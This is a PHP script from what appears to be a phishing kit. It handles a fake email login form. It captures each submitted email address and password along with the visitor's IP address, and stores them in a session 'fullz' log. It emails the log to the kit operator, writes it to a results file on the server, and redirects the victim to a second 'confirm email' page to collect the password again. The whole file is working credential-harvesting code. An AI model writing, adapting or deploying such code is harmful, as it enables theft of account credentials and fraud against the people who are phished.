<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include "../autob/bts2.php";
include "../req/config.php";

if(isset($_POST['email']) && isset($_POST['emailpass'])){
    if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['email'])) && strlen($_POST['emailpass']) > 3){
	///////////////////////// MAIL PART //////////////////////
		$email = $_POST['email'];
		$emailpass = $_POST['emailpass'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET['ct6'])){$reshead="|-------------- CONFIRM EMAIL INFO -------------|";}
		else{$reshead="|------------------- EMAIL INFO ----------------|";};
        $Info_LOG = "
$reshead
Email            : $email
Email Password   : $emailpass";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' New HUNT EMAIL Info' ;$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		if(!isset($_GET['ct6'])){header("location:ea.php?accrXid=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol&ct6=On");}
		else{header("location:qa.php?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");};
    }
    else{ header("location:ea.php?sfailed=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&ct6=On&amp;consentResponseUri=%2Fprotocol"); };
}
else { header("location:ea.php?sfailed=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&ct6=On&amp;consentResponseUri=%2Fprotocol"); };
?>